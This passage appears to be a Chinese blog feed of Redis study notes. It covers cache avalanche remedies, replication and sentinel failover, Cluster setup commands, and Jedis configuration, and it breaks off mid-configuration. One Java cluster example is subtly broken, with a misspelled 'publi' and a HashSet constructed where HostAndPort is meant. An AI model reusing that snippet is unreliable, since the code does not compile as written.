&lt;value&gt; nx ex 10//nx: 上锁, ex: 过期时间, 10: 过期时间为10秒</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210814/互斥锁.75h7xq3fu9c0.png" alt="互斥锁" style="zoom:67%;" /><p>优点：较好地降低后端存储负载，并在一致性上做得比较好。</p><p>缺点：当缓存失效的时候，同一时间只有一个线程读数据库然后回写缓存，其他线程都处于阻塞状态。如果是高并发场景，大量线程阻塞会降低吞吐量。</p><div class="note info no-icon flat"><p>关于穿透与击穿的一些小知识<br>学完上面的<code>缓存穿透</code>与<code>缓存击穿</code>，有些人可能时间久了容易忘记（记忆力好的可以忽略），况且两个词字面上看也有点相近（小声bb），于是就去查了一些资料。<br> <code>穿透</code>，本义可指：贯穿，经过，通过；<br><code>击穿</code>，第一联想是击穿电压，电击穿等等，其实大多也是指在<code>高压力下</code>的破坏和穿孔现象。<br>单看两词，意思相近，但主要区别在于所受的<code>环境压力</code>。</p></div><h2 id="缓存雪崩">缓存雪崩</h2><h3 id="概念-3">概念</h3><p>与缓存击穿相似，但区别在于<code>缓存雪崩</code>针对<code>大量key缓存</code>，而<code>缓存击穿则</code>则是针对<code>某个key</code>。</p><p>由于<code>缓存层</code>承载着大量请求，有效地<code>保护</code>了存储层，但是如果<code>缓存层</code>由于某些原因不可用（宕机）或者<code>大量缓存</code>由于<code>过期时间相同</code>在同一时间段失效（大批key失效/热点数据失效），<code>大量请求</code>直接到达存储层，存储层压力过大导致系统雪崩。</p><p>同一时间大面积失效，那一瞬间Redis跟没有一样，那这个数量级别的请求直接打到数据库几乎是<code>灾难性</code>的。</p><h3 id="造成原因-2">造成原因</h3><ol><li>大量数据同时过期</li><li>Redis故障宕机</li></ol><h3 id="解决方案-3">解决方案</h3><h4 id="针对大量数据同时过期">针对大量数据同时过期</h4><p><strong>一、均匀设置过期时间</strong></p><p>预防大面积的 key 同时失效，可以给不同的 key 过期时间加上随机值，让缓存失效的时间点尽量均匀，这样可以保证数据不会在同一时间大面积失效。</p><p><strong>二、分布式互斥锁</strong></p><p>保证同一时间只有一个业务线程更新缓存，未能获取互斥锁的请求，要么等待锁释放后重新读取缓存，要么就返回空值或者默认值。与<code>缓存击穿</code>的措施相似。</p><p><strong>三、双key策略</strong></p><p>对缓存数据可以使用两个 key，一个是<code>主 key，会设置过期时间</code>，一个是<code>备 key，不会设置过期</code>，它们只是 key 不一样，但是 value 值是一样的，相当于给缓存数据做了个副本。</p><p>当业务线程访问不到<code>主 key </code>的缓存数据时，就直接返回<code>备 key </code>的缓存数据，然后在更新缓存的时候，同时<code>更新 主 key 和 备 key 的数据</code>。</p><p><strong>四、后台更新缓存</strong></p><p>业务线程不再负责更新缓存，缓存也不设置有效期，而是<code>让缓存“永久有效”</code>，并将更新缓存的工作<code>交由后台线程定时更新</code>。</p><p>事实上，缓存数据不设置有效期，并不是意味着数据一直能在内存里，因为<code>当系统内存紧张的时候，有些缓存数据会被“淘汰”</code>，而在缓存被“淘汰”到下一次后台定时更新缓存的这段时间内，业务线程读取缓存失败就返回空值，业务的视角就以为是数据丢失了。</p><p>如何解决上面的问题呢？</p><ol><li><p><code>后台线程</code>不仅负责定时更新缓存，而且也负责<code>频繁地检测缓存是否有效</code>，检测到缓存失效了，可能原因是系统紧张而被淘汰的，于是就要马上<code>从数据库读取数据，并更新到缓存</code>。</p><p>这种方式的检测时间间隔不能太长，太长也导致用户获取的数据是一个空值而不是真正的数据，所以检测的间隔最好是<code>毫秒级</code>的，但是总归是有个间隔时间，用户体验一般。</p></li><li><p>在业务线程发现缓存数据失效后（缓存数据被淘汰），<code>通过消息队列发送一条消息通知后台线程更新缓存</code>，后台线程收到消息后，在更新缓存前可以判断缓存是否存在，存在就不执行更新缓存操作；不存在就读取数据库数据，并将数据加载到缓存。</p><p>这种方式相比第一种方式缓存的更新会更及时，用户体验也比较好。</p></li></ol><h4 id="针对Redis故障宕机">针对Redis故障宕机</h4><p><strong>一、服务熔断或请求限流机制</strong></p><p>当Redis故障宕机而导致缓存雪崩问题时，我们可以启动<code>服务熔断</code>机制，<code>暂停业务应用对缓存服务的访问，直接返回错误</code>，不用再继续访问数据库，从而降低对数据库的访问压力，保证数据库系统的正常运行，然后等到 <code>Redis 恢复正常</code>后，再允许业务应用访问缓存服务。</p><p><code>服务熔断机制</code>是保护数据库的正常允许，但是暂停了业务应用访问缓存服务系统，全部业务都<code>无法正常工作</code>。</p><p>为了减少对业务的影响，我们可以启用<code>请求限流</code>机制，只将<code>少部分请求</code>发送到数据库进行处理，再多的请求就在入口直接拒绝服务，等到 Redis 恢复正常并把缓存预热完后，再解除请求限流的机制。</p><p><strong>二、构建Redis缓存高可靠集群</strong></p><p>服务熔断或请求限流机制是<code>缓存雪崩发生后</code>的应对方案，我们最好通过<code>主从节点的方式构建 Redis 缓存高可靠集群</code>。</p><p>如果 Redis 缓存的主节点故障宕机，从节点可以切换成为主节点，继续提供缓存服务，避免了由于 Redis 故障宕机而导致的缓存雪崩问题。</p><h2 id="缓存颠簸">缓存颠簸</h2><p><code>缓存颠簸</code>，也被称为“缓存抖动”，可以看作一种比“雪崩”更轻微的故障，但是也会在一段时间内对系统造成冲击和性能影响，一般是由<code>缓存节点故障</code>导致的。</p><p>业内推荐的做法是通过一致性Hash算法来解决问题。</p><h2 id="缓存预热">缓存预热</h2><p>即系统上线后，先将<code>相关的数据构建到缓存中</code>，这样就可以避免用户请求的时候直接查库。</p><p>这部分预热的数据主要取决于<code>访问量</code>和<code>数据量大小</code>。如果数据的访问量不大的话，那么就没必要做预热，都没什么多少请求了，直接按正常的缓存读取流程执行就好。</p><p>访问量大的话，也要看数据的大小来做预热措施。</p><ol><li>数据量不大的时候，系统启动的时候<code>进行加载缓存</code>动作，这种数据一般可以是电商首页的运营位之类的信息；</li><li>数据量大的时候，设置一个<code>定时任务脚本</code>，进行<code>缓存的刷新</code>；</li><li>数据量太大的时候，优先保证热点数据进行<code>提前加载到缓存</code>，并且确保访问期间不能更改缓存，比如用定时器在秒杀活动前30分钟就把商品信息之类的刷新到缓存，同时规定后台运营人员不能在秒杀期间更改商品属性。</li></ol><h2 id="缓存降级">缓存降级</h2><p>即<code>缓存失效</code>或<code>缓存服务器挂掉</code>的情况下，<code>不去访问数据库</code>，直接返回默认数据或访问服务的内存数据。</p><p>在项目实战中通常会将部分热点数据缓存到服务的内存中，类似 <code>HashMap</code>、<code>Guava</code> 这样的工具，一旦缓存出现异常，可以直接使用服务的内存数据，从而避免数据库遭受巨大压力。</p><p>当然，这样的操作对于业务是<code>有损害</code>的，<code>分布式系统</code>中很容易出现<code>数据不一致问题</code>。</p><p>所以，一般这种情况下，我们都优先保证从<code>运维角度</code>确保缓存服务器的<code>高可用性</code>。比如 Redis 的部署采用集群方式，同时做好备份。总之，尽量避免出现降级的影响。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis学习笔记（2）</title>
      <link href="/posts/1bb24f34/"/>
      <url>/posts/1bb24f34/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note orange icon flat"><i class="note-icon fas fa-bullhorn"></i><p>前方多图提醒，请耐心等待加载或刷新页面，已参考多种资料，作图不易，且看且珍惜。（快累趴了）</p></div><h1>Redis主从复制</h1><h2 id="概述">概述</h2><p><code>主从复制</code>，主机数据更新后根据配置和策略，自动同步道备机的<code>master/slaver机制</code>，<code>Master以写为主</code>，<code>Slave以读为主</code>。</p><p>其作用有以下几点：</p><ul><li>读写分离：主服务器负责写，各从服务器负责读，即主机写，从机读</li><li>容灾快速恢复：主从多台服务器进行持久化操作，任意一台服务器宕机也不会影响数据恢复，有效避免了单点故障问题，使数据持久化更加安全</li><li>其他：主从复制是实现哨兵模式和Redis集群的前提</li></ul><h2 id="实现主从复制">实现主从复制</h2><p>每一台<code>Redis</code>服务器启动时，默认都为主服务器（master）,可通过命令<code>info replcation</code>查看</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/1.5foiw2sgbgo0.jpg" alt="1"></p><ol><li><p>配置文件修改</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /myredis                # 创建文件夹存储配置文件</span><br><span class="line">cd /myredis# 进入文件夹</span><br><span class="line">cp /etc/redis.conf /myredis/redis.conf# 复制原配置文件，以便操作</span><br></pre></td></tr></table></figure><p>创建<code>reids6379.conf</code>、<code>reids6380.conf</code>、<code>reids6381.conf</code>文件，在文件中填入以下信息</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include /myredis/redis.<span class="keyword">conf</span></span><br><span class="line">pidfile /var/run/redis_端口号.pid</span><br><span class="line">port （端口号）</span><br><span class="line">dbfilename dump（端口号）.rdb</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/2.6wgs4wui72w0.jpg" alt="2"></p></li><li><p>启动redis服务器</p><p>新建窗口通过<code>redis-cli -p 端口号</code>进入各自的客户端</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/3.36sncsb6o840.jpg" alt="3"></p></li><li><p>使用命令实现主从关系（配从不配主）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slaveof &lt;masterip&gt; &lt;masterport&gt;</span><br></pre></td></tr></table></figure><p>详情如下图所示</p><p>从节点：</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E4%BB%8E%E8%8A%82%E7%82%B9.31rkn6xum640.jpg" alt="从节点"></p><p>主节点：</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E4%B8%BB%E8%8A%82%E7%82%B9.124i7i3mtvg0.jpg" alt="主节点"></p></li><li><p>主从关系实现后，验证是否实现数据复制</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E6%95%B0%E6%8D%AE%E5%A4%8D%E5%88%B6.3458jbrjayg0.jpg" alt="数据复制"></p></li></ol><h2 id="主从复制原理">主从复制原理</h2><p>在Redis2.8之前同步方式都以<code>全量方式</code>同步，但之后为了提高效率，数据复制方式分为两种：<code>全量复制</code>和<code>部分复制</code>。</p><ul><li>全量复制：将主服务器中的数据，全部同步到从服务器中，一般是在从服务器启动初始化数据的时候进行全量同步</li><li>部分复制：将未同步的增量数据，同步到从服务器，无需再全部复制一遍，一般用于因网络中断等无法同步数据的情况下，待恢复正常之后，将中断期间的数据进行部分同步</li></ul><h3 id="全量复制图解">全量复制图解</h3><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/全量复制.40tonu0t4to0.png" alt="全量复制" style="zoom: 50%;" /><p>解释说明：</p><p>1、从节点断开连接后，发送同步请求<code>psync</code>尝试建立连接</p><p>2、主节点向从节点发送信息，获取<code>runid</code>和<code>offset</code></p><p>3、主节点fork子进程将全部数据生成<code>RDB文件</code></p><p>4、主节点期间接收到的<code>write</code>命令存入到复制缓冲区</p><p>5、当主节点<code>RDB文件</code>完成后发送给从节点</p><p>6、从节点接受<code>RDB文件</code>后，清空旧数据，加载RDB数据到内存中（即直接将其作为数据文件）</p><p>7、主节点发送缓冲区内的数据到从节点</p><p>8、从节点接受复制缓冲区命令并执行，最后同步到最新数据中</p><h3 id="部分复制图解">部分复制图解</h3><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/部分复制.6cn0kqkut9o0.png" alt="部分复制" style="zoom:50%;" /><p>解释说明：</p><p>1、当主从服务器之间由于网络中断后，从节点会尝试连接主节点</p><p>2、重连期间主节点接收到的<code>write</code>命令会存入到复制缓冲区</p><p>3、当网络恢复后，从节点成功连接主节点，由于之前从节点保存了主节点的<code>runid</code> 和<code>offset</code>，所以只需要发送命令 <code>psync &#123;runid&#125; &#123;offset&#125;</code>即可</p><p>4、主节点接收到从节点的请求，会先验证请求的<code>runid</code>是否和自身的的 <code>runid</code>匹配，不匹配则进行<code>全量复制</code>，其后查看请求的<code>offset</code>在自身复制缓冲区查找，如果偏移量之后的数据存在缓冲区中，则对从节点发送<code> +CONTINUE</code> 响应，表示可以进行部分复制。</p><p>5、当从节点传递过来的runid和offset验证通过时，则进行部分复制，并记录新的<code>offset</code></p><div class="note info flat"><p>PS：当主机宕机时，主从关系仍存在，各从机中的主机信息不会发生改变，主机重启后，其从机信息与宕机前的一致</p></div><h2 id="模式">模式</h2><h3 id="一、薪火相传"><strong>一、薪火相传</strong></h3><p>有三个节点ABC，A为主机，B为A的从机，C为B的从机。</p><ol><li>主机A无法对C进行主从复制</li><li>当主机A存活时，B、C都不可写数据，只能读数据</li><li>主机A宕机后，B、C仍不可写数据，直到B使用<code>slaveof no one</code>命令后，即下面所讲的<code>反客为主</code>模式，B可以写数据，C可以读取B写的数据</li></ol><p><strong>官方概述</strong>：上一个<code>slave</code>（从机）可以是下一个<code>slave</code>（从机）的<code>master</code>（主机），<code>slave</code>同样可以接收其他slaves的连接和同步请求，那么该<code>slave</code>作为了链条中下一个的<code>master</code>，可以有效减轻<code>master</code>的写压力。</p><p><strong>风险</strong>：一旦某个从机宕机，后面的从机都无法备份。</p><p><strong>中途变更转向</strong>：会清除之前的数据，重新建立拷贝最新的。</p><h3 id="二、反客为主"><strong>二、反客为主</strong></h3><p>当一个<code>master</code>宕机后，后面的<code>slave</code>通过命令可以立刻升为<code>master</code>，其后面的<code>slave</code>不用做任何修改，但不用修改的前提在于<code>从机</code>实现了薪火相传模式，否则仍需进行主从关系确认。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slaveof no one# 将从机变为主机</span><br></pre></td></tr></table></figure><p>当宕机后的<code>master</code>重启后，此时已无任何主从关系，无任何复制关系。</p><h3 id="三、哨兵模式"><strong>三、哨兵模式</strong></h3><p>哨兵模式，俗称<font color="red">反客为主的自动版</font>，能够后台监控主机是否故障，若故障了则根据<code>投票数</code>自动<code>将从库转换为主库</code>，保证了系统的可用性。</p><h4 id="作用">作用</h4><ul><li>监控（Monitoring）：哨兵会不断地检查主节点和从节点是否运行正常</li><li>自动故障转移（Automatic faliover）：当主节点不能正常工作时，哨兵会开始自动故障转移操作，它会将失效主节点的其中一个从节点升级为新的主节点，并让其他从节点改为复制新的主节点</li><li>配置提供者（Configuration provider）：客户端在初始化时，通过连接哨兵来获得当前Redis服务的主节点地址</li><li>通知（Notification）：哨兵可以将故障转移的结果发送给客户端</li></ul><h4 id="步骤">步骤</h4><ol><li><p>调整为<code>一主二仆模式</code>，<code>6379</code>带着<code>6380</code>、<code>6381</code></p></li><li><p>在自定义的<code>/myredis</code>目录下新建<code>sentinel.conf</code>，切记文件名不能有错</p></li><li><p>配置哨兵</p><p>在<code>sentinel.conf</code>文件中填入配置信息，保存退出</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sentinel monitor mymaster <span class="number">127.0</span>.<span class="number">0.1</span> <span class="number">6379</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>注：<code>mymaster</code>为监控对象起的服务器名称（即哨兵名称），<code>1</code>为至少有多少个哨兵同意迁移的数量</p></li><li><p>启动哨兵</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-sentinel /myredis/sentinel.conf</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E5%93%A8%E5%85%B5%E5%90%AF%E5%8A%A8.6svp11zonng0.jpg" alt="启动哨兵"></p></li><li><p>当主节点6379宕机后，等待30秒，哨兵进行投票推选新主节点</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E5%93%A8%E5%85%B5%E7%A5%A8%E9%80%89.5xpehoup20s0.jpg" alt="哨兵票选"></p></li><li><p>当主节点6379重新连接后，哨兵服务端响应两句</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E5%8E%9F%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF.18mr2583aghs.jpg" alt="原主机上线"></p><p>第一句是：去除6379的下线处理</p><p>第二句是：重连6379到新的主节点上，此时6379为新主节点的从节点</p></li><li><p>检验主从复制是否正常工作</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E6%A3%80%E9%AA%8C%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6.62himtzsuys0.jpg" alt="检验主从复制"></p><p>上图所见，主从复制正常运行，至此，哨兵模式的配置完成</p></li></ol><h4 id="优缺点">优缺点</h4><p>优点：<code>高可用</code>，<code>读写分离</code>，哨兵模式是基于主从模式的，主从模式的优点，哨兵模式都具备，主从可以自动切换，系统更健壮，可用性更高。</p><p>缺点：Redis比较难支持在线扩容，在集群容量达到上线时在线扩容会变得非常复杂。</p><h1>Redis集群</h1><h2 id="概述-2">概述</h2><p>所谓的集群，就是通过添加服务器的数量，提供相同的服务，从而让服务器达到一个稳定、高效的状态，集群主要解决<code>容量不够</code>和<code>并发写操作压力</code>等问题。</p><p>Redis3.0版本之前只支持单例（代理主机），在3.0版本即以后的版本才支持集群，采用<code>无中心化集群</code>配置。</p><p>Redis集群，是基于Redis主从复制实现的，同时也存在三种模式：<code>主从模式</code>、<code>哨兵模式</code>和<code>Cluster集群模式</code>。</p><p>由于前两种模式在前面<code>主从复制</code>环节中有讲解，所以我们这里重点关注<code>Cluster模式</code>。</p><h2 id="Cluster集群模式">Cluster集群模式</h2><ul><li>之前的<code>哨兵模式</code>基本已经可以实现高可用、读写分离，但是在这种模式每台redis服务器都存储相同的数据，很<code>浪费内存资源</code>，所以在Redis3.0上加入了<code>Cluster集群模式</code>，实现了Redis的<code>分布式存储</code>，也就是说每台Redis节点存储着不同的内容</li><li>根据官方推荐，集群部署至少要<code>3台以上</code>的master节点，最好使用<code>3主3从</code>六个节点的模式</li><li>Cluster集群由多个redis服务器组成的<code>分布式网络服务集群</code>，集群之中有多个master主节点，每一个主节点都可读可写，节点之间会相互通信，两两相连，redis集群无中心节点</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E6%97%A0%E4%B8%AD%E5%BF%83%E5%8C%96%E9%9B%86%E7%BE%A4.2s6cwtc8k6g0.png" alt="无中心化集群"></p><ul><li>在<code>redis-Cluster集群</code>中，可以给每个主节点添加从节点，主节点和从节点直接遵循主从模型的特性，当用户需要处理更多读请求的时候，添加从节点可以扩展系统的读性能</li><li><code>redis-cluster</code>的<code>故障转移</code>：redis集群的主机节点内置了类似redis sentinel的<code>节点故障检测</code>和<code>自动故障转移</code>功能，当集群中的某个主节点下线时，集群中的其他在线主节点会注意到这一点，并且对已经下线的主节点进行故障转移</li><li>集群进行故障转移的方法和<code>redis sentinel</code>进行故障转移的方法基本一样，不同的是，在集群里面，故障转移是由集群中其他在线的主节点负责进行的，所以集群不必另外使用<code>redis sentinel</code></li></ul><h3 id="步骤-2">步骤</h3><ol><li><p>删除持久化数据（rdb/aof文件）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /myredis# 进入自定义目录</span><br><span class="line">rm -rf rdb*# 删除rdb文件，如若有aof文件，也一并删除</span><br></pre></td></tr></table></figure></li><li><p>实例准备</p><p>Master端口：6379、6380、6381</p><p>Slave端口：6389、6390、6391</p><div class="note warning flat"><p>分配原则尽量保证每个主数据库运行在不同的IP地址，每个从库和主库不在一个IP地址上。</p></div><p>配置文件<code>redis6379.conf</code></p><p>删除之前的哨兵数据，添加下面的集群配置，保存退出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cluster-enabled yes# 打开集群模式</span><br><span class="line">cluster-config-file nodes-6379.conf# 设定节点配置文件</span><br><span class="line">cluster-node-timeout 15000# 集群节点的超时时限默认值</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AE%E5%88%A0%E9%99%A4.aamudg5l9f4.jpg" alt="集群配置删除"></p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AE%E6%B7%BB%E5%8A%A0.4c4xk3rl6qi0.jpg" alt="集群配置添加"></p><p>删除原来的<code>redis6380.conf</code>和<code>redis6381.conf</code>文件，另外<code>拷贝5份</code>修改的<code>redis6379.conf</code>为对应端口号文件</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E6%8B%B7%E8%B4%9D%E6%96%87%E4%BB%B6.185f6wfoq2yo.jpg" alt="拷贝文件"></p><p>进入vim编辑器，在命令模式下使用<code>:%s/6379/替换后端口</code>快速修改5份拷贝后的配置文件信息</p></li><li><p>启动6个redis服务</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1.22uohujnmgcg.jpg" alt="启动服务"></p></li><li><p>组合集群</p><p>组合之前，确保所有redis服务启动后，<code>nodes-端口号.conf</code>文件都生成正常</p><p>如果你是redis5.0及之后的，无需安装ruby依赖，redis安装目录里内置了集群命令行工具redis-trib ，它是一个 Ruby 程序， 这个程序通过向实例发送特殊命令来完成创建新集群， 检查群， 或者对集群进行重新分片工作。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli --cluster create 192.168.30.0:6379 192.168.30.0:6380 192.168.30.0:6381 192.168.30.0:6389 192.168.30.0:6390 192.168.30.0:6391 --cluster-replicas 1# 组合命令</span><br></pre></td></tr></table></figure> <div class="note info no-icon flat"><p>ps：<code>--cluster-replicas 1</code> 这个指的是从机的数量，表示我们希望为集群中的每个主节点创建一个从节点。另外，主从是随机绑定的，创建完成后可以在master节点中看到所有节点状态（netstat -natp | grep 6379）</p></div><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E7%BB%84%E5%90%88%E9%9B%86%E7%BE%A4.5p63gwu2zhk0.jpg" alt="组合集群"></p></li><li><p>测试集群</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -c -p 端口号    # -c参数实现自动重定向，连接客户端</span><br><span class="line">cluster info    # 查看集群状态</span><br><span class="line">cluster nodes    # 查看节点信息</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E6%B5%8B%E8%AF%95%E9%9B%86%E7%BE%A4.h1u9gsuk0nc.jpg" alt="测试集群"></p><p>如图所示，集群搭建成功。</p> <div class="note info no-icon flat"><p>Redis 集群有<code>16384</code>个<code>哈希槽</code>，每个<code>key</code>通过<code>CRC16</code>校验后对16384取模来决定放置哪个槽。集群的每个节点负责一部分hash槽，举个例子，比如当前集群有3个节点ABC，那么：</p><ul><li>节点 A 包含 <code>0</code> 到 <code>5460</code>号哈希槽</li><li>节点 B 包含<code>5461</code> 到 <code>10922</code> 号哈希槽</li><li>节点 C 包含<code>10923</code> 到 <code>16383</code>号哈希槽</li></ul></div><p>尝试往集群中写入数据</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E5%86%99%E5%85%A5%E6%95%B0%E6%8D%AE.5rjk9tsc1xs0.jpg" alt="写入数据"></p><p>不在一个<code>slot</code>下的键值，是不能使用<code>mget、mset等多键操作</code>，但可通过<code>&#123;&#125;</code>内相同内容的键值对放到同一个<code>slot</code>中去</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210809/%E5%A4%9A%E9%94%AE%E6%93%8D%E4%BD%9C.3ukznasnqym0.jpg" alt="多键操作"></p><p>查询集群中的值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cluster keyslot &lt;key&gt;                # 计算key的插槽值</span><br><span class="line">cluster countkeysinslot &lt;slot&gt;        # 返回slot槽的键数(只能查看自己插槽范围内的值)</span><br><span class="line">cluster getkeysinslot &lt;slot&gt; &lt;count&gt;# 返回count个slot槽中的键</span><br></pre></td></tr></table></figure></li><li><p>集群的Jedis开发</p><p>无中心化主从集群。即使连接的不是主机，集群会自动切换主机存储。遵循<code>主写从读</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- jedis依赖包引入  --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">     &lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class="line">     &lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class="line"> &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JedisClusterTest</span></span>&#123;</span><br><span class="line">    <span class="function">publi <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">         Set&lt;HostAndPort&gt; set = <span class="keyword">new</span> HashSet&lt;HostAndPort&gt;();</span><br><span class="line">         set.add(<span class="keyword">new</span> HashSet&lt;HostAndPort&gt;(<span class="string">&quot;192.168.30.0&quot;</span>,<span class="number">6379</span>));</span><br><span class="line">         JedisCluster jc = <span class="keyword">new</span> JedisCluster(set);</span><br><span class="line">         jc.set(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;zeker&quot;</span>);</span><br><span class="line">         String value = jc.get(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">         System.out.println(value);</span><br><span class="line">         jc.close();</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="集群优缺点">集群优缺点</h3><p>优点：实现扩容、分摊压力、无中心配置相对简单</p><p>缺点：多键操作、多键的Redis事务、lua脚本均不被支持</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring boot整合Redis</title>
      <link href="/posts/b921ad40/"/>
      <url>/posts/b921ad40/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1>Jedis、Spring-data-redis的配置以及区别</h1><h2 id="Jedis如何配置">Jedis如何配置</h2><ol><li>jedis引入依赖</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--        Jedis引入依赖--&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li><p>连接Redis客户端</p><ol><li><p>Jedis直连</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Jedis jedis = <span class="keyword">new</span> Jedis(<span class="string">&quot;192.168.30.0&quot;</span>, <span class="number">6379</span>);</span><br><span class="line">jedis.set(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br><span class="line">String value = jedis.get(<span class="string">&quot;hello&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>JedisPool 连接池的使用</p><p>配置文件<code>jedis.properties</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 资源池最大连接数</span><br><span class="line">maxTotal=<span class="number">50</span>             </span><br><span class="line"># 资源池允许最大空闲连接数</span><br><span class="line">maxIdle=<span class="number">10</span>              